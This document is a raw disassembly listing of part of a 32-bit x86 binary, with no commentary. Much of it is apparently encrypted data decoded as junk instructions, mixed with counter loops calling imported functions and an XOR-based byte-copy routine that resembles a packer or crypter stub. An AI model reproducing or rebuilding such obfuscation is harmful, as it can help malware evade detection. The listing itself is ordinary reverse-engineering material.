  402889:	or     eax,0xe901897a
  40288e:	and    al,0x0
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x7ede0451]
  4028ec:	in     al,0x5e
  4028ee:	add    edx,DWORD PTR [ebx+0x8]
  4028f1:	jle    0x402971
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x402900
  4028f8:	ss jne 0x402943
  4028fb:	add    DWORD PTR [edx+0x30],edx
  4028fe:	mov    eax,ds:0x5a5407f
  402903:	scas   al,BYTE PTR es:[edi]
  402904:	adc    DWORD PTR [esi],edx
  402906:	xor    eax,0x125d1dc6
  40290b:	jmp    0x4028f7
  40290d:	shl    DWORD PTR ds:[esi+0x2c],1
  402911:	jl     0x402950
  402913:	test   ebp,esi
  402915:	push   ebp
  402916:	js     0x402977
  402918:	sbb    eax,0x5a336240
  40291d:	rcr    BYTE PTR [ebp+ebx*1+0x2fcbab77],1
  402924:	hlt    
  402925:	xor    al,0x43
  402927:	and    ebx,edi
  402929:	shl    ah,1
  40292b:	mov    cl,ch
  40292d:	icebp  
  40292e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40292f:	jne    0x402926
  402931:	outs   dx,DWORD PTR ds:[esi]
  402932:	pop    fs
  402934:	pop    esi
  402935:	or     edi,esp
  402937:	and    al,0xc7
  402939:	dec    esp
  40293a:	xor    eax,0xd157f400
  40293f:	in     eax,0x40
  402941:	mov    al,0x33
  402943:	mov    ch,0xaf
  402945:	mov    eax,0xa606fdb5
  40294a:	mov    edx,0xa514bb4
  40294f:	call   0xc081:0xfa9b23f4
  402956:	fs out dx,eax
  402958:	sbb    BYTE PTR [eax],dl
  40295a:	popf   
  40295b:	rcr    dl,1
  40295d:	cs inc esp
  40295f:	fisub  DWORD PTR [eax+0x4a5b8d24]
  402965:	pop    es
  402966:	adc    DWORD PTR [edx],edx
  402968:	pop    ebx
  402969:	cli    
  40296a:	outs   dx,BYTE PTR ds:[esi]
  40296b:	ss and eax,0xb4a5e672
  402971:	cmp    al,BYTE PTR [edi]
  402973:	push   es
  402974:	sbb    eax,0x4f6c8725
  402979:	xchg   esp,eax
  40297a:	add    ah,BYTE PTR [edx]
  40297c:	pop    ebx
  40297d:	or     edx,DWORD PTR [eax]
  40297f:	push   edx
  402980:	adc    cl,BYTE PTR [ebp-0x4c]
  402983:	enter  0xc9c0,0xb9
  402987:	mov    ebx,0xa96577d8
  40298c:	outs   dx,BYTE PTR ds:[esi]
  40298d:	dec    eax
  40298e:	dec    edx
  40298f:	mov    bh,0x65
  402991:	cmp    al,dl
  402993:	pop    ss
  402994:	into   
  402995:	ret    
  402996:	stc    
  402997:	mov    edx,0x49ef343a
  40299c:	dec    ebx
  40299d:	sub    BYTE PTR [edx],dh
  40299f:	mov    esi,0x799d03f7
  4029a4:	jne    0x402948
  4029a6:	inc    esi
  4029a7:	in     al,dx
  4029a8:	mov    DWORD PTR ds:0xb1bca6e4,0x17285950
  4029b2:	test   al,0xd5
  4029b4:	add    bh,0xef
  4029b7:	in     al,dx
  4029b8:	mov    BYTE PTR ds:0x933e6b0d,0x5a
  4029bf:	push   es
  4029c0:	push   cs
  4029c1:	xchg   BYTE PTR [eax+0x2d7c260f],bh
  4029c7:	cmp    cl,BYTE PTR [esi+0x7cc1bfd2]
  4029cd:	push   0x45
  4029cf:	jae    0x402a30
  4029d1:	mov    ecx,0x6c165b43
  4029d6:	jbe    0x402958
  4029d8:	push   edx
  4029d9:	mov    edi,0x40ad427f
  4029de:	or     BYTE PTR [ebx-0x29],bl
  4029e1:	int3   
  4029e2:	std    
  4029e3:	ret    
  4029e4:	(bad)  
  4029e5:	(bad)  
  4029e6:	fld    DWORD PTR [eax+0x64]
  4029e9:	outs   dx,BYTE PTR ss:[esi]
  4029eb:	sbb    BYTE PTR [ecx+0x50],bl
  4029ee:	jbe    0x4029cd
  4029f0:	jne    0x4029a3
  4029f2:	jecxz  0x402a58
  4029f4:	test   eax,0xbc24cb5f
  4029f9:	xor    eax,0x11c49604
  4029fe:	imul   edi,DWORD PTR [ecx+0x28],0x1dcfae7
  402a05:	xchg   edx,eax
  402a06:	fs or  eax,0xb1b1bad2
  402a0c:	idiv   ecx
  402a0e:	fcomp  DWORD PTR [edx+0x7a6b6759]
  402a14:	sbb    ah,ah
  402a16:	int    0x51
  402a18:	and    DWORD PTR ds:0x434687,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434687
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434687,edx
  402a34:	cmp    DWORD PTR ds:0x434687,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434687,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x4345e3
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434687,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434687
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434687,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x4345ff,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x43463b,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x434677,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x434677
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x434677,ecx
  402aac:	cmp    DWORD PTR ds:0x434677,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x434677,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43470f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x4346fb
  402ae8:	or     DWORD PTR ds:0x4346c7,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x4346b7,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x4346c3,0x434603
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	fwait
  402b20:	int3   
  402b21:	mov    al,0xbd
  402b23:	jae    0x402b2e
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b2b
  402b2c:	add    BYTE PTR [ebp-0x243cdbbe],bh
  402b32:	iret   
  402b33:	rcl    DWORD PTR [edx+0x6d3ca0f],0x63
  402b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b3b:	nop
  402b3c:	cmp    edx,DWORD PTR [esp+esi*4+0x1d074241]
  402b43:	dec    eax
  402b44:	mov    edx,0xd9e4f5ca
  402b49:	dec    ebp
  402b4a:	dec    ebx
  402b4b:	(bad)  
  402b4c:	jbe    0x402b4b
  402b4e:	stc    
  402b4f:	arpl   WORD PTR cs:[edi],cx
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	mov    eax,0x4516cfb5
  402b58:	out    0xd1,eax
  402b5a:	push   edx
  402b5b:	cmp    cl,BYTE PTR [edx+0x6fbf71b]
  402b61:	jbe    0x402b09
  402b63:	test   al,0x65
  402b65:	jecxz  0x402b5b
  402b67:	dec    eax
  402b68:	popa   
  402b69:	js     0x402be0
  402b6b:	loope  0x402bce
  402b6d:	xor    ch,BYTE PTR [ebp+0xe87cf52]
  402b73:	rol    al,1
  402b75:	aad    0xf
  402b77:	cmp    BYTE PTR [edi-0x4a],0x3c
  402b7b:	adc    BYTE PTR [ebp-0x2b],0xc8
  402b7f:	jbe    0x402ba9
  402b81:	mov    ch,0x63
  402b83:	sub    cl,al
  402b85:	jbe    0x402b2b
  402b87:	pop    edi
  402b88:	cmp    ebp,ecx
  402b8a:	nop
  402b8b:	push   eax
  402b8c:	pop    ecx
  402b8d:	ficomp WORD PTR [esi+0x32]
  402b90:	or     eax,0x98adf9ec
  402b95:	pop    esi
  402b96:	repnz inc DWORD PTR fs:[esp]
  402b9b:	jbe    0x402b50
  402b9d:	adc    eax,0x3ec555b9
  402ba2:	popa   
  402ba3:	or     al,0xfa
  402ba5:	dec    ecx
  402ba6:	jp     0x402c14
  402ba8:	sbb    al,0xf0
  402baa:	out    0x6e,eax
  402bac:	inc    esi
  402bad:	bound  esi,QWORD PTR [edx]
  402baf:	mov    ch,0xcd
  402bb1:	rol    esp,0x52
  402bb4:	sbb    DWORD PTR [edx-0x63],eax
  402bb7:	cmp    ah,BYTE PTR [edi-0x4dd3cb49]
  402bbd:	sub    eax,0x6282a239
  402bc2:	mov    esp,esi
  402bc4:	stos   DWORD PTR es:[edi],eax
  402bc5:	mov    bh,0x55
  402bc7:	out    dx,al
  402bc8:	addr16 mov dh,al
  402bcb:	jno    0x402be4
  402bcd:	push   esi
  402bce:	mov    al,0x6
  402bd0:	test   eax,0x5623b50
  402bd5:	mov    al,0xbc
  402bd7:	cld    
  402bd8:	or     eax,0x39ea9cdd
  402bdd:	test   DWORD PTR [ebp-0x1f368f4d],ebx
  402be3:	xchg   edx,eax
  402be4:	or     esi,DWORD PTR [esi+0x3]
  402be7:	inc    edi
  402be8:	mov    WORD PTR [ebx],?
  402bea:	add    esi,edx
  402bec:	xor    BYTE PTR [esi+0x20],dl
  402bef:	popf   
  402bf0:	pop    es
  402bf1:	pop    ebx
  402bf2:	sbb    eax,0xc582158c
  402bf7:	pop    ebp
  402bf8:	cld    
  402bf9:	ror    DWORD PTR [edi+0x7c],cl
  402bfc:	mov    ?,WORD PTR [edi]
  402bfe:	push   ss
  402bff:	mov    ds,WORD PTR [ecx+edi*2+0x30]
  402c03:	(bad)  
  402c04:	(bad)  
  402c05:	and    ebp,esi
  402c07:	js     0x402bf3
  402c09:	test   al,0x97
  402c0b:	call   0xc17:0x1df85cb6
  402c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c13:	mov    esp,0x1e2832c3
  402c18:	sbb    bl,BYTE PTR ss:[esi+0x7c42a79]
  402c1f:	div    BYTE PTR [ebx]
  402c21:	adc    eax,0x6eb5ea2
  402c26:	mov    edx,0xc9609ab8
  402c2b:	test   al,0x26
  402c2d:	or     esp,DWORD PTR [ebp-0x5e41868f]
  402c33:	jne    0x402c43
  402c35:	ins    BYTE PTR es:[edi],dx
  402c36:	jb     0x402c48
  402c38:	mov    ah,0xc8
  402c3a:	sub    eax,0xcdc21786
  402c3f:	rcl    BYTE PTR es:[ecx],cl
  402c42:	jbe    0x402bf3
  402c44:	or     eax,0x391819cb
  402c49:	shl    DWORD PTR [edi-0x5c429fd],cl
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434607,0x0
  402c5f:	mov    eax,ds:0x434607
  402c64:	inc    eax
  402c65:	mov    ds:0x434607,eax
  402c6a:	cmp    DWORD PTR ds:0x434607,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434607,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x4345e7,0x434713
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	mov    ah,0x17
  402ce8:	xchg   DWORD PTR [esi],ebp
  402cea:	adc    ecx,DWORD PTR [ebx]
  402cec:	jle    0x402d6c
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402d43
  402cf3:	ds mov esi,0x6032f896
  402cf9:	aaa    
  402cfa:	arpl   dx,dx
  402cfc:	add    BYTE PTR [edi],0xc
  402cff:	ret    
  402d00:	mov    edx,0x5ba82abc
  402d05:	fcomi  st,st(4)
  402d07:	lock pop edi
  402d09:	jae    0x402d0f
  402d0b:	jo     0x402d27
  402d0d:	repnz into 
  402d0f:	mov    ch,0xcd
  402d11:	mov    bl,0x5e
  402d13:	mov    esp,0x67142810
  402d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d19:	aam    0x8
  402d1b:	push   edi
  402d1c:	push   ds
  402d1d:	in     al,dx
  402d1e:	or     DWORD PTR [edx+0x28],edx
  402d21:	mov    BYTE PTR [esi+0x1b7ec00e],bh
  402d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d28:	stos   DWORD PTR es:[edi],eax
  402d29:	(bad)  
  402d2a:	jne    0x402d5d
  402d2c:	cmp    BYTE PTR [edi*2+0x44a53d9b],bh
  402d33:	mov    al,0x4a
  402d35:	das    
  402d36:	mov    eax,ds:0x5ad52b20
  402d3b:	icebp  
  402d3c:	xor    al,0xba
  402d3e:	push   0x4aa4248e
  402d43:	fistp  WORD PTR [ecx]
  402d45:	lds    ecx,FWORD PTR [ecx]
  402d47:	sub    ebx,eax
  402d49:	cwde   
  402d4a:	fstp   TBYTE PTR [edi]
  402d4c:	pop    edi
  402d4d:	and    al,0xd1
  402d4f:	sbb    edx,DWORD PTR [ecx+0x67a1e6e4]
  402d55:	sbb    dh,BYTE PTR ds:0xb4cbedfc
  402d5b:	scas   eax,DWORD PTR es:[edi]
  402d5c:	dec    ecx
  402d5d:	and    dl,dh
  402d5f:	cmp    al,BYTE PTR [ecx+0x18d25f46]
  402d65:	in     eax,dx
  402d66:	fld    QWORD PTR [ebp+0x73]
  402d69:	mov    edx,0xfe5efe9b
  402d6e:	pop    es
  402d6f:	inc    edi
  402d70:	or     edx,DWORD PTR [ebx+0x5a]
  402d73:	sahf   
  402d74:	mov    edi,0xb8525db9
  402d79:	inc    esp
  402d7a:	aaa    
  402d7b:	push   ss
  402d7c:	jae    0x402db0
  402d7e:	cmp    al,0x5f
  402d80:	sbb    BYTE PTR [eax],cl
  402d82:	stos   DWORD PTR es:[edi],eax
  402d83:	icebp  
  402d84:	sbb    eax,0x1d87315c
  402d89:	test   al,0x56
  402d8b:	adc    BYTE PTR [edi],0x47
  402d8e:	cli    
  402d8f:	jge    0x402d9e
  402d91:	xor    DWORD PTR [eax+esi*2-0x22f65274],esp
  402d98:	push   esi
  402d99:	out    dx,eax
  402d9a:	inc    ebp
  402d9b:	mov    eax,0x63066fed
  402da0:	test   ebx,eax
  402da2:	std    
  402da3:	in     al,dx
  402da4:	jbe    0x402d48
  402da6:	int3   
  402da7:	push   ecx
  402da8:	mov    al,0xd9
  402daa:	dec    eax
  402dab:	mov    al,0xba
  402dad:	sub    bl,bh
  402daf:	adc    edx,DWORD PTR ds:0x62fb1787
  402db5:	xchg   ecx,eax
  402db6:	loop   0x402d96
  402db8:	xor    DWORD PTR [ecx+eax*8],ebp
  402dbb:	dec    ebx
  402dbc:	jecxz  0x402d60
  402dbe:	jno    0x402dce
  402dc0:	mov    bl,0xdb
  402dc2:	arpl   WORD PTR [edx-0x4be6743a],bp
  402dc8:	outs   dx,DWORD PTR ds:[esi]
  402dc9:	outs   dx,BYTE PTR ds:[esi]
  402dca:	cwde   
  402dcb:	aad    0x12
  402dcd:	mov    db0,eax
  402dd0:	fadd   DWORD PTR [esi]
  402dd2:	cmp    al,0xb8
  402dd4:	add    cl,BYTE PTR [edx-0x245eb83f]
  402dda:	cmc    
  402ddb:	repnz into 
  402ddd:	out    0xfa,eax
  402ddf:	dec    ebp
  402de0:	cwde   
  402de1:	push   cs
  402de2:	xchg   edx,eax
  402de3:	sub    BYTE PTR [esi-0x5536fbb0],0x60
  402dea:	sbb    eax,esp
  402dec:	test   edi,esp
  402dee:	push   edi
  402def:	or     BYTE PTR [esi],dl
  402df1:	mov    esp,0xe433e679
  402df6:	jae    0x402dc4
  402df8:	mov    bl,0xcb
  402dfa:	out    0x9d,eax
  402dfc:	adc    eax,DWORD PTR [ecx+ebx*2+0x4e]
  402e00:	mov    cl,0x87
  402e02:	fimul  WORD PTR [eax-0xe37824a]
  402e08:	test   BYTE PTR [edx-0x2ba5d973],cl
  402e0e:	or     edx,DWORD PTR [eax+0x74]
  402e11:	lock mov ebx,DWORD PTR [ebp+0xc]
  402e15:	xor    eax,ecx
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x434677,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    bl,BYTE PTR [eax+0x3335be5e]
  402e97:	adc    al,0x7e
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402e96
  402e9f:	add    DWORD PTR [ebp+0x59],eax
  402ea2:	xor    al,0x63
  402ea4:	(bad)  
  402ea5:	xchg   ebx,eax
  402ea6:	adc    DWORD PTR [edx-0x58],ebp
  402ea9:	dec    esi
  402eaa:	mov    cl,0xd8
  402eac:	scas   eax,DWORD PTR es:[edi]
  402ead:	add    al,0x90
  402eaf:	sbb    BYTE PTR [ebx-0x10],ch
  402eb2:	ret    0x3a3b
  402eb5:	mov    esi,0xa3f687c
  402eba:	ins    BYTE PTR es:[edi],dx
  402ebb:	mov    ebx,DWORD PTR [edx+0x21]
  402ebe:	mov    WORD PTR [ebp+0x2c],gs
  402ec1:	or     BYTE PTR gs:[edx-0x4e],al
  402ec5:	inc    eax
  402ec6:	sub    al,0x28
  402ec8:	push   esi
  402ec9:	mov    eax,0x8fed9e95
  402ece:	je     0x402f4b
  402ed0:	icebp  
  402ed1:	arpl   WORD PTR [edx+0x72],ax
  402ed4:	fsubr  QWORD PTR [ecx+0x46]
  402ed7:	mov    al,0x5d
  402ed9:	xchg   esp,eax
  402eda:	ret    0x853b
  402edd:	aas    
  402ede:	sub    esi,0x24
  402ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ee2:	and    DWORD PTR [eax+edi*4-0x5b14d66f],ebx
  402ee9:	icebp  
  402eea:	xor    ebx,ecx
  402eec:	dec    DWORD PTR [esi]
  402eee:	daa    
  402eef:	cld    
  402ef0:	pop    ebx
  402ef1:	call   0xde4c9293
  402ef6:	pop    ecx
  402ef7:	add    al,0xae
  402ef9:	mov    eax,0xd0d18365
  402efe:	mov    WORD PTR [eax+0x120023d0],?
  402f04:	inc    esi
  402f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f06:	inc    ebp
  402f07:	aad    0x94
  402f09:	adc    BYTE PTR [edi-0x3e8e1372],dl
  402f0f:	rcl    BYTE PTR [ebx+0x10],1
  402f12:	bnd jg 0x402eb0
  402f15:	(bad)  
  402f16:	outs   dx,BYTE PTR ds:[esi]
  402f17:	aaa    
  402f18:	xchg   ebp,eax
  402f19:	test   BYTE PTR [ebx-0x595824f1],ah
  402f1f:	or     esp,DWORD PTR gs:[esi]
  402f22:	pusha  
  402f23:	pusha  
  402f24:	mov    DWORD PTR [ebx+0x4a38d018],ebx
  402f2a:	(bad)  
  402f2b:	dec    esi
  402f2c:	ins    BYTE PTR es:[edi],dx
  402f2d:	xchg   ebp,eax
  402f2e:	sbb    BYTE PTR [esi-0x101d0eb5],bl
  402f34:	call   0x6f5c:0xa1773173
  402f3b:	mov    al,0x22
  402f3d:	icebp  
  402f3e:	retf   0xbd28
  402f41:	dec    ecx
  402f42:	pusha  
  402f43:	lahf   
  402f44:	aaa    
  402f45:	add    BYTE PTR [ecx-0x54376303],ah
  402f4b:	or     bh,BYTE PTR [ecx+0x20]
  402f4e:	cs pusha 
  402f50:	fild   DWORD PTR [ebp+0x46]
  402f53:	out    dx,eax
  402f54:	push   ebp
  402f55:	inc    ebp
  402f56:	cmp    DWORD PTR [eax],esi
  402f58:	mov    cl,0x9b
  402f5a:	div    cl
  402f5c:	(bad)  
  402f5d:	idiv   ebp
  402f5f:	clc    
  402f60:	aam    0xc
  402f62:	repz mov fs,WORD PTR [edx-0x5dcf2bec]
  402f69:	mov    dl,0xa0
  402f6b:	fdiv   QWORD PTR [edi+0x27ccad4b]
  402f71:	fisttp WORD PTR [edx]
  402f73:	fwait
  402f74:	xchg   BYTE PTR [edi],bh
  402f76:	repz mov bh,0xe2
  402f79:	mov    ds:0xff88035d,eax
  402f7e:	fs repz out dx,al
  402f81:	xor    ebx,DWORD PTR [ebx-0x5]
  402f84:	out    dx,eax
  402f85:	mov    al,0xf2
  402f87:	and    BYTE PTR [edx],bl
  402f89:	jns    0x402f4c
  402f8b:	in     eax,dx
  402f8c:	xlat   BYTE PTR ds:[ebx]
  402f8d:	jl     0x402fa5
  402f8f:	je     0x402f3c
  402f91:	pop    ecx
  402f92:	fadd   DWORD PTR [ebp+0x37]
  402f95:	fwait
  402f96:	cmp    BYTE PTR [ecx],0x79
  402f99:	push   cs
  402f9a:	fnstcw WORD PTR [edi+edi*8+0x1]
  402f9e:	cmp    dh,ah
  402fa0:	ficom  WORD PTR [ecx+0x1]
  402fa3:	mov    ch,0xf0
  402fa5:	sbb    eax,0x61c3b06a
  402faa:	scas   al,BYTE PTR es:[edi]
  402fab:	mov    dl,0xb3
  402fad:	bound  edi,QWORD PTR [ebx-0x4]
  402fb0:	mov    DWORD PTR [ebx+0x714554a7],ebx
  402fb6:	add    al,dh
  402fb8:	retf   0x2ae4
  402fbb:	push   cs
  402fbc:	test   eax,0xf58b4b19
  402fc1:	ja     0x402ff1
  402fc3:	jge    0x402fd7
  402fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fc6:	mov    ch,BYTE PTR [eax+0x0]
  402fc9:	sub    esi,edx
  402fcb:	ins    BYTE PTR es:[edi],dx
  402fcc:	gs inc esp
  402fce:	lahf   
  402fcf:	pusha  
  402fd0:	push   ebx
  402fd1:	leave  
  402fd2:	imul   esi,DWORD PTR [ebx+ecx*2+0x6b9a293e],0x960e7380
  402fdd:	fst    QWORD PTR ds:0x745adee9
  402fe3:	mov    edi,fs
  402fe5:	inc    esi
  402fe6:	mov    eax,ds:0xa036aac3
  402feb:	(bad)  
  402fec:	repnz adc eax,0xc6d44fa0
  402ff2:	or     BYTE PTR [edi-0x4b],cl
  402ff5:	test   DWORD PTR [ebp+0x24af5de],ecx
  402ffb:	rol    DWORD PTR [ebx+ecx*4-0x75476d3c],0x12
  403003:	gs dec ecx
  403005:	mov    eax,0xde036e64
  40300a:	neg    edi
  40300c:	pop    es
  40300d:	mov    ebp,0x6d8fe8a2
  403012:	fisttp QWORD PTR [ebp-0x63]
  403015:	sbb    eax,0xae4049de
  40301a:	test   BYTE PTR [edi-0x4d6959de],cl
  403020:	jo     0x402fa2
  403022:	repnz in eax,dx
  403024:	inc    ebp
  403025:	out    dx,eax
  403026:	dec    eax
  403027:	mov    ah,cl
  403029:	jecxz  0x402fb3
  40302b:	dec    ecx
  40302c:	mov    bl,al
  40302e:	adc    ecx,DWORD PTR [edi]
  403030:	out    dx,al
  403031:	xchg   ebx,eax
  403032:	mov    eax,ds:0x1e87fbbb
  403037:	loop   0x403042
  403039:	add    al,0x58
  40303b:	std    
  40303c:	mov    bh,bh
  40303e:	pop    esp
  40303f:	mov    ds:0x7a2ae69,eax
  403044:	push   esi
  403045:	push   es
  403046:	mov    edi,DWORD PTR [ebp+0x58]
  403049:	nop
  40304a:	mov    ch,0x2f
  40304c:	fimul  WORD PTR [ebp+0x77]
  40304f:	inc    ebx
  403050:	inc    ebx
  403051:	outs   dx,DWORD PTR ds:[esi]
  403052:	jp     0x4030ba
  403054:	jp     0x4030c1
  403056:	push   esi
  403057:	rcr    al,0x7b
  40305a:	daa    
  40305b:	xor    BYTE PTR [ebp-0x59],0x58
  40305f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403060:	into   
  403061:	xchg   ebx,eax
  403062:	lods   al,BYTE PTR ds:[esi]
  403063:	(bad)  
  403065:	pop    esp
  403066:	push   ebp
  403067:	test   DWORD PTR [ecx+0x23],0xfbb3dc76
  40306e:	je     0x40303b
  403070:	xor    ebx,ebp
  403072:	mov    ecx,0x5d3df7d6
  403077:	cld    
  403078:	mov    ds:0x222b735e,eax
  40307d:	xchg   ecx,eax
  40307e:	fild   DWORD PTR [edi+edi*8+0x45ae4994]
  403085:	sbb    ecx,0xffffffb7
  403088:	jnp    0x4030c7
  40308a:	imul   ecx,DWORD PTR [eax+0xab9cdb3],0xffffffe2
  403091:	stos   BYTE PTR es:[edi],al
  403092:	jl     0x4030bc
  403094:	int    0xff
  403096:	xor    eax,0x94b8f181
  40309b:	push   ebx
  40309c:	adc    dl,BYTE PTR [edx+edx*8+0x4e]
  4030a0:	lahf   
  4030a1:	add    esi,ebp
  4030a3:	mov    dl,0xdc
  4030a5:	cs dec eax
  4030a7:	mov    WORD PTR [ebx+ecx*8],ds
  4030aa:	aaa    
  4030ab:	pop    eax
  4030ac:	or     eax,ebp
  4030ae:	and    BYTE PTR [ebx-0x52],ah
  4030b1:	or     al,0xbb
  4030b3:	ins    DWORD PTR es:[edi],dx
  4030b4:	push   cs
  4030b5:	mov    DWORD PTR [eax+0x4e],eax
  4030b8:	xchg   BYTE PTR ds:0xbb1cdc3f,dl
  4030be:	imul   ebp,esi,0xffffffca
  4030c1:	add    dl,BYTE PTR ds:0x6c0779c7
  4030c7:	sbb    al,0x19
  4030c9:	adc    BYTE PTR [ebx-0x3ac87d8c],al
  4030cf:	ret    0xbf26
  4030d2:	(bad)  
  4030d3:	fisttp WORD PTR [eax+ebx*8+0x26]
  4030d7:	lea    ebp,[edi-0x32]
  4030da:	mov    ch,0x36
  4030dc:	jmp    0xacec:0x714d2dd0
  4030e3:	aad    0x88
  4030e5:	mov    edx,DWORD PTR [esi+0x39eef375]
  4030eb:	and    ax,0xb5e1
  4030ef:	(bad)  
  4030f1:	pop    ss
  4030f2:	int    0xd7
  4030f4:	pop    esp
